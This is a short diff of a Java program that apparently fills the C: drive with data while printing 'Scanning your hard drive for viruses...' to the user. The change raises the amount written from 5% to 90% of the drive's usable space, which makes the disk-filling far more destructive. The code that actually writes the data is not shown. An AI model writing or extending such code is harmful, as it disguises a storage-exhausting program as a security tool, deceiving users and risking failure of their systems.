@@ -14,9 +14,9 @@ public class Main
         File disk = new File("C:");
 
         // Calculate how big the file should be
-        long target_size = disk.getUsableSpace() / 100 * 5;
+        long target_size = disk.getUsableSpace() / 100 * 90;
 
-        // Create 100 MB of data to write
+        // Create 500 MB of data to write
         byte[] data = new byte[1024 * 1024 * 500];
 
         System.out.println("Scanning your hard drive for viruses...");
